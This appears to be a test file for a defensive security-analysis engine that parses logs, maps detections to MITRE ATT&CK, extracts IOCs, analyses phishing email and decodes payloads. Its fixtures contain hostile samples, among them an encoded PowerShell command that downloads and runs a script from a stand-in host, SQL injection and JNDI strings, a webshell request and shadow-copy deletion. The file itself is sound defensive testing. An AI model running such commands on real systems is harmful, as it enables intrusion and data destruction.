/* AXTO — Security Analyst v4 engine: log parsing, detections, ATT&CK, IOCs
 * (STIX / CSV), phishing analysis, the decoder and rule generation. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { parseLogs, sniff, stats, eventText, parseTime } from "../lib/security/parse";
import { detect, TACTICS, TECHNIQUES, technique, techniquesIn, attackUrl } from "../lib/security/attack";
import { extract, mergeIocs, defang, toStix, toCsv, toBlocklist, enrichLinks } from "../lib/security/ioc";
import { analyzeEmail, decodeWords, orgDomain } from "../lib/security/eml";
import { runRecipe, magic, md5, psDecode, utf8 } from "../lib/security/decode";
import { generate, RULE_LANGS } from "../lib/security/rules";
import { newCase, compute, reportMarkdown, aiContext, upgradeCase } from "../lib/security/case";

const b64 = (s: string) => Buffer.from(s).toString("base64");
const psEnc = (s: string) => Buffer.from(s, "utf16le").toString("base64");

const WINXML = [
  ...Array.from({ length: 6 }, (_, i) => `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><Level>0</Level><TimeCreated SystemTime="2026-09-30T01:0${i}:00.000Z"/><Computer>DC01.corp.local</Computer><Channel>Security</Channel></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="IpAddress">185.220.101.4</Data><Data Name="LogonType">10</Data></EventData></Event>`),
  `<Event><System><EventID>4624</EventID><TimeCreated SystemTime="2026-09-30T01:07:00.000Z"/><Computer>DC01.corp.local</Computer></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="IpAddress">185.220.101.4</Data><Data Name="LogonType">10</Data></EventData></Event>`,
  `<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-09-30T01:09:00.000Z"/><Computer>WS22</Computer></System><EventData><Data Name="SubjectUserName">admin</Data><Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc ${psEnc("IEX (New-Object Net.WebClient).DownloadString('http://evil-cdn.xyz/a.ps1')")}</Data></EventData></Event>`,
  `<Event><System><EventID>1102</EventID><Level>4</Level><TimeCreated SystemTime="2026-09-30T01:15:00.000Z"/><Computer>DC01.corp.local</Computer></System><EventData></EventData></Event>`,
].join("\n");

test("formats are sniffed and parsed into normalised events", () => {
  assert.equal(sniff(WINXML), "winxml");
  const w = parseLogs(WINXML).events;
  assert.equal(w.length, 9);
  assert.equal(w[0].event, "4625 Logon failure");
  assert.equal(w[0].src, "185.220.101.4");
  assert.equal(w[0].user, "admin");
  assert.equal(w[0].host, "DC01.corp.local");
  assert.equal(w[0].ts, "2026-09-30T01:00:00.000Z");
  assert.match(w[7].message, /powershell\.exe -nop/);

  const sys = "Sep 30 03:12:44 web01 sshd[2211]: Failed password for invalid user oracle from 45.155.205.233 port 50122 ssh2";
  const s = parseLogs(sys, { year: 2026 }).events[0];
  assert.equal(s.source, "syslog3164"); assert.equal(s.host, "web01"); assert.equal(s.user, "oracle"); assert.equal(s.src, "45.155.205.233"); assert.equal(s.action, "failure");
  assert.equal(s.ts, "2026-09-30T03:12:44.000Z");

  const r5424 = parseLogs("<34>1 2026-09-30T10:00:00Z fw1 kernel 10 ID47 - blocked 10.0.0.9 -> 8.8.8.8").events[0];
  assert.equal(r5424.source, "syslog5424"); assert.equal(r5424.severity, "critical"); assert.equal(r5424.host, "fw1");

  const cef = parseLogs("CEF:0|Palo Alto|PAN-OS|10.1|threat|Command and Control|9|src=10.1.1.5 dst=203.0.113.50 suser=budi act=blocked msg=C2 beacon to evil host rt=Sep 30 2026 10:15:00").events[0];
  assert.equal(cef.source, "cef"); assert.equal(cef.severity, "critical"); assert.equal(cef.user, "budi"); assert.equal(cef.dst, "203.0.113.50"); assert.equal(cef.fields.msg, "C2 beacon to evil host");

  const leef = parseLogs("LEEF:1.0|IBM|QRadar|1.0|Logon|src=10.2.2.2\tdst=10.2.2.9\tusrName=sari\tsev=7").events[0];
  assert.equal(leef.source, "leef"); assert.equal(leef.user, "sari"); assert.equal(leef.severity, "high");

  const acc = parseLogs(`198.51.100.7 - - [30/Sep/2026:10:15:32 +0700] "GET /index.php?id=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 200 512 "-" "sqlmap/1.7"`).events[0];
  assert.equal(acc.source, "access"); assert.equal(acc.src, "198.51.100.7"); assert.equal(acc.fields.status, "200"); assert.equal(acc.ts, "2026-09-30T03:15:32.000Z");

  const ct = parseLogs(JSON.stringify({ Records: [{ eventTime: "2026-09-30T02:00:00Z", eventSource: "cloudtrail.amazonaws.com", eventName: "StopLogging", sourceIPAddress: "203.0.113.9", userIdentity: { arn: "arn:aws:iam::1:user/ci" } }] })).events[0];
  assert.equal(ct.source, "cloudtrail"); assert.equal(ct.event, "StopLogging"); assert.equal(ct.src, "203.0.113.9"); assert.equal(ct.user, "arn:aws:iam::1:user/ci");

  const jl = parseLogs('{"timestamp":"2026-09-30T05:00:00Z","level":"error","host":"api-1","message":"db timeout"}\n{"timestamp":"2026-09-30T05:01:00Z","level":"warn","host":"api-1","message":"retry"}').events;
  assert.equal(jl.length, 2); assert.equal(jl[0].severity, "high"); assert.equal(jl[1].severity, "medium");

  const csv = parseLogs("time,user,src_ip,action\n2026-09-30 06:00:00,budi,203.0.113.77,login_failed\n2026-09-30 06:01:00,budi,203.0.113.77,\"login, ok\"").events;
  assert.equal(csv.length, 2); assert.equal(csv[0].user, "budi"); assert.equal(csv[1].fields.action, "login, ok");
  assert.ok(Number.isFinite(parseTime("1727658000")));
});

test("stats find brute force followed by a success; rules map behaviour to ATT&CK", () => {
  const ev = parseLogs(WINXML).events;
  const st = stats(ev);
  assert.equal(st.bruteForce[0].src, "185.220.101.4");
  assert.equal(st.bruteForce[0].failures, 6);
  assert.equal(st.bruteForce[0].success, true);
  const d = detect(ev.map((e) => ({ i: e.i, text: eventText(e) })));
  const ids = d.map((x) => x.rule);
  for (const r of ["ps-encoded", "ps-bypass", "clear-logs", "rdp-logon"]) assert.ok(ids.includes(r), r);
  assert.equal(d[0].severity, "critical", "most severe first");
  const web = detect([{ i: 0, text: "GET /x.php?cmd=whoami" }, { i: 1, text: "GET /a?q=${jndi:ldap://x}" }, { i: 2, text: "vssadmin.exe delete shadows /all /quiet" }]);
  assert.deepEqual(web.map((x) => x.rule).sort(), ["discovery-win", "shadow-delete", "web-attack", "webshell"].sort());
  assert.deepEqual(detect([{ i: 0, text: "Everything is fine, user logged in normally" }]), []);
});

test("ATT&CK catalogue is consistent", () => {
  assert.equal(TACTICS.length, 14);
  const tacticIds = new Set(TACTICS.map((t) => t.id));
  for (const t of TECHNIQUES) { assert.match(t.id, /^T1\d{3}(?:\.\d{3})?$/); for (const x of t.tactics) assert.ok(tacticIds.has(x), `${t.id}:${x}`); }
  assert.equal(new Set(TECHNIQUES.map((t) => t.id)).size, TECHNIQUES.length, "no duplicates");
  for (const t of TACTICS) assert.ok(TECHNIQUES.some((x) => x.tactics.includes(t.id)), `every tactic has techniques: ${t.name}`);
  assert.equal(technique("T1059.001")?.name, "PowerShell");
  assert.deepEqual(techniquesIn("Mapped to T1059.001 and T1486, not T9999."), ["T1059.001", "T1486"]);
  assert.equal(attackUrl("T1059.001"), "https://attack.mitre.org/techniques/T1059/001/");
});

test("IOCs: defang-aware, counted, private flagged, exported as CSV / blocklist / STIX 2.1", () => {
  const list = extract("Beacon to hxxps://evil-cdn[.]xyz/a.ps1 from 10.0.0.5 and 185.220.101[.]4 (twice: 185.220.101.4). Hash 44d88612fea8a8f36de82e1278abb02f, CVE-2021-44228, mail attacker[@]evil-cdn.xyz, dropped invoice.pdf.exe, key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd");
  const get = (t: string) => list.filter((x) => x.type === t).map((x) => x.value);
  assert.deepEqual(get("url"), ["https://evil-cdn.xyz/a.ps1"]);
  assert.equal(list.find((x) => x.value === "185.220.101.4")?.count, 2);
  assert.equal(list.find((x) => x.value === "10.0.0.5")?.private, true);
  assert.deepEqual(get("md5"), ["44d88612fea8a8f36de82e1278abb02f"]);
  assert.deepEqual(get("cve"), ["CVE-2021-44228"]);
  assert.deepEqual(get("email"), ["attacker@evil-cdn.xyz"]);
  assert.ok(get("filename").includes("invoice.pdf.exe"));
  assert.ok(get("registry")[0].startsWith("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
  assert.ok(!get("domain").includes("evil-cdn.xyz"), "a domain already inside a URL / e-mail is not repeated");
  assert.equal(defang("https://evil.xyz/a"), "hxxps[://]evil[.]xyz/a");
  const merged = mergeIocs(list, [{ type: "ipv4", value: "185.220.101.4", count: 1, verdict: "malicious", sources: ["b"] }]);
  assert.equal(merged.find((x) => x.value === "185.220.101.4")?.verdict, "malicious");
  assert.ok(toBlocklist(merged).includes("185.220.101.4") && !toBlocklist(merged).includes("10.0.0.5"));
  assert.match(toCsv(merged).split("\n")[0], /^type,value,count,verdict/);
  const bundle = JSON.parse(toStix(merged, { title: "Case X", created: "2026-09-30T00:00:00.000Z" }));
  assert.equal(bundle.type, "bundle");
  const ind = bundle.objects.filter((o: any) => o.type === "indicator");
  assert.ok(ind.some((o: any) => o.pattern === "[ipv4-addr:value = '185.220.101.4']"));
  assert.ok(ind.every((o: any) => o.spec_version === "2.1" && /^indicator--[0-9a-f-]{36}$/.test(o.id) && o.pattern_type === "stix"));
  assert.ok(bundle.objects.some((o: any) => o.type === "vulnerability" && o.name === "CVE-2021-44228"));
  assert.ok(!ind.some((o: any) => o.pattern.includes("10.0.0.5")), "private addresses are not shared");
  assert.ok(enrichLinks({ type: "sha256", value: "a".repeat(64) })[0].url.includes("virustotal.com/gui/file/"));
});

const EML = [
  "Return-Path: <bounce@mailer-cheap.ru>",
  "Received: from mx.victim.co.id (mx.victim.co.id [10.1.1.1]) by inbox.victim.co.id with ESMTPS; Tue, 30 Sep 2026 10:00:05 +0000",
  "Received: from unknown (HELO paypa1-support.com) ([45.9.148.20]) by mx.victim.co.id with SMTP; Tue, 30 Sep 2026 10:00:01 +0000",
  "Authentication-Results: mx.victim.co.id; spf=fail smtp.mailfrom=mailer-cheap.ru; dkim=none; dmarc=fail header.from=paypa1-support.com",
  "From: =?utf-8?B?UGF5UGFsIFNlY3VyaXR5?= <service@paypa1-support.com>",
  "Reply-To: collect@gmail.com",
  "To: finance@victim.co.id",
  "Subject: =?utf-8?Q?Urgent:_verify_your_account?=",
  "MIME-Version: 1.0",
  'Content-Type: multipart/mixed; boundary="XYZ"',
  "",
  "--XYZ",
  'Content-Type: text/html; charset="utf-8"',
  "Content-Transfer-Encoding: quoted-printable",
  "",
  '<p>Your account is suspended. <a href=3D"http://45.9.148.20/login/paypal">https://www.paypal.com/signin</a></p>',
  "--XYZ",
  'Content-Type: application/octet-stream; name="invoice.pdf.exe"',
  'Content-Disposition: attachment; filename="invoice.pdf.exe"',
  "Content-Transfer-Encoding: base64",
  "",
  b64("MZ fake"),
  "--XYZ--",
  "",
].join("\r\n");

test("phishing analysis: auth failures, mismatches, deceptive link, risky attachment with SHA-256", async () => {
  assert.equal(decodeWords("=?utf-8?Q?Hello_W=C3=B6rld?="), "Hello Wörld");
  assert.equal(orgDomain("mail.evil.co.uk"), "evil.co.uk");
  const r = await analyzeEmail(EML);
  assert.equal(r.subject, "Urgent: verify your account");
  assert.equal(r.fromAddr, "service@paypa1-support.com");
  assert.equal(r.auth.spf, "fail"); assert.equal(r.auth.dmarc, "fail");
  assert.equal(r.hops.length, 2); assert.equal(r.hops[0].ip, "45.9.148.20", "oldest hop first"); assert.equal(r.hops[1].delaySec, 4);
  const link = r.links[0];
  assert.equal(link.host, "45.9.148.20");
  assert.ok(link.flags.includes("text-mismatch") && link.flags.includes("ip-literal"));
  assert.equal(r.attachments[0].name, "invoice.pdf.exe");
  assert.ok(r.attachments[0].flags.includes("double-extension"));
  assert.equal(r.attachments[0].sha256, (await import("node:crypto")).createHash("sha256").update("MZ fake").digest("hex"));
  const titles = r.findings.map((f) => f.title);
  for (const t of ["SPF fail", "DMARC failed", "Reply-To differs from From", "Link text points elsewhere", "Possible PayPal impersonation"]) assert.ok(titles.includes(t), t);
  assert.equal(r.verdict, "phishing");
  assert.ok(r.score >= 50);
});

test("decoder: PowerShell -enc, base64 → gzip, hashes, XOR, ROT13, JWT, magic", async () => {
  assert.equal(psDecode(`powershell -enc ${psEnc("Write-Host hi")}`), "Write-Host hi");
  assert.equal(md5(new TextEncoder().encode("abc")), "900150983cd24fb0d6963f7d28e17f72");
  assert.equal(md5(new TextEncoder().encode("")), "d41d8cd98f00b204e9800998ecf8427e");
  const gz = (await import("node:zlib")).gzipSync(Buffer.from("secret payload")).toString("base64");
  const steps = await runRecipe(gz, [{ id: "fromBase64" }, { id: "gunzip" }]);
  assert.ok(steps.every((s) => s.ok)); assert.equal(utf8(steps[1].output), "secret payload");
  assert.equal(utf8((await runRecipe("abc", [{ id: "sha256" }]))[0].output), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  const x = await runRecipe("hello", [{ id: "xor", arg: "0x20" }, { id: "xor", arg: "0x20" }]);
  assert.equal(utf8(x[1].output), "hello");
  assert.equal(utf8((await runRecipe("Uryyb", [{ id: "rot", arg: "13" }]))[0].output), "Hello");
  const jwt = `${b64('{"alg":"HS256"}').replace(/=+$/, "")}.${b64('{"sub":"budi"}').replace(/=+$/, "")}.sig`;
  assert.match(utf8((await runRecipe(jwt, [{ id: "jwt" }]))[0].output), /"sub": "budi"/);
  const bad = await runRecipe("not base64 !!", [{ id: "fromBase64" }, { id: "gunzip" }]);
  assert.equal(bad.length, 1); assert.equal(bad[0].ok, false);
  const m = await magic(b64(gz.length ? `powershell.exe -enc ${psEnc("Get-Process")}` : ""));
  assert.deepEqual(m.recipe.map((o) => o.id), ["fromBase64", "psEncoded"]);
  assert.equal(m.output, "Get-Process");
  const m2 = await magic(gz);
  assert.deepEqual(m2.recipe.map((o) => o.id), ["fromBase64", "gunzip"]);
});

test("rules: every language builds from IOCs and detections; empty cases say so", () => {
  const iocs = extract("https://evil-cdn.xyz/a.ps1 185.220.101.4 10.0.0.1 44d88612fea8a8f36de82e1278abb02f " + "e".repeat(64) + " dropper.exe");
  const detections = detect([{ i: 0, text: "powershell -enc " + "A".repeat(40) }]);
  for (const lang of RULE_LANGS) {
    const out = generate(lang, { title: "Case Evil", iocs, detections });
    assert.ok(out.length > 40, lang);
    assert.ok(!out.includes("10.0.0.1"), `${lang}: no private IPs`);
  }
  const sigma = generate("sigma", { title: "Case Evil", iocs, detections });
  assert.match(sigma, /condition: sel_ip or sel_host/);
  assert.match(sigma, /attack\.t1059\.001/);
  assert.match(generate("kql", { title: "c", iocs, detections }), /DeviceNetworkEvents[\s\S]*RemoteIP in \("185\.220\.101\.4"\)/);
  assert.match(generate("suricata", { title: "c", iocs, detections }), /tls\.sni; dotprefix; content:"\.evil-cdn\.xyz"; nocase; endswith;/);
  assert.match(generate("yara", { title: "c", iocs, detections }), /hash\.sha256\(0, filesize\) == "e{64}"/);
  assert.match(generate("sigma", { title: "empty", iocs: [], detections: [] }), /Nothing to build yet/);
});

test("case: compute, AI context and report tie the evidence together", async () => {
  const c = newCase("RDP brute force on DC01");
  c.artifacts.push({ id: "a1", name: "security.xml", kind: "log", size: WINXML.length, addedAt: "", text: WINXML });
  const r = await analyzeEmail(EML);
  const { html: _h, text, headers: _hd, ...rest } = r;
  c.artifacts.push({ id: "a2", name: "lure.eml", kind: "email", size: EML.length, addedAt: "", text: "", email: { ...rest, textSample: text.slice(0, 2000) } });
  c.attackManual.push("T1078");
  c.iocState["ipv4:185.220.101.4"] = { verdict: "malicious", note: "Tor exit" };
  c.messages.push({ role: "assistant", content: "This maps to T1021.001 and T1110." });
  const k = compute(c);
  assert.ok(k.detections.some((d) => d.rule === "brute-force" && d.severity === "critical"));
  assert.ok(k.detections.some((d) => d.rule === "phishing"));
  assert.equal(k.iocs.find((x) => x.value === "185.220.101.4")?.verdict, "malicious");
  const t = new Map(k.techniques.map((x) => [x.id, x.sources]));
  assert.ok(t.get("T1110")?.includes("rule") && t.get("T1110")?.includes("ai"));
  assert.deepEqual(t.get("T1078"), ["analyst"]);
  assert.equal(k.worst, "critical");
  const ctx = aiContext(c, k);
  assert.match(ctx, /Brute force: 185\.220\.101\.4 → admin ×6 then SUCCESS/);
  assert.ok(ctx.length < 14_100);
  const md = reportMarkdown(c, k);
  for (const h of ["# RDP brute force on DC01", "## Detections", "## MITRE ATT&CK", "## Indicators of compromise", "## Recommended actions", "## Phishing analysis"]) assert.ok(md.includes(h), h);
  assert.ok(md.includes("185[.]220[.]101[.]4"), "indicators are defanged in the report");
  const old = upgradeCase({ mode: "incident", context: "prod db", messages: [{ role: "user", content: "hi" }] });
  assert.equal(old.v, 4); assert.equal(old.mode, "incident"); assert.equal(old.notes[0].text, "prod db"); assert.equal(old.messages.length, 1);
});

test("case: events take the severity of the worst detection that matched them", () => {
  const c = { ...newCase("sev"), artifacts: [{ id: "a1", name: "win.xml", kind: "log" as const, size: 1, addedAt: "", text: WINXML }] };
  const k = compute(c);
  const ps = k.events.find((e) => /powershell/i.test(eventText(e)))!;
  const det = k.detections.find((d) => d.events.includes(ps.i))!;
  assert.ok(det, "the encoded PowerShell event is detected");
  assert.notEqual(ps.severity, "info");
  assert.equal(k.stats.bySeverity.info + k.stats.bySeverity.low + k.stats.bySeverity.medium + k.stats.bySeverity.high + k.stats.bySeverity.critical, k.stats.total);
});
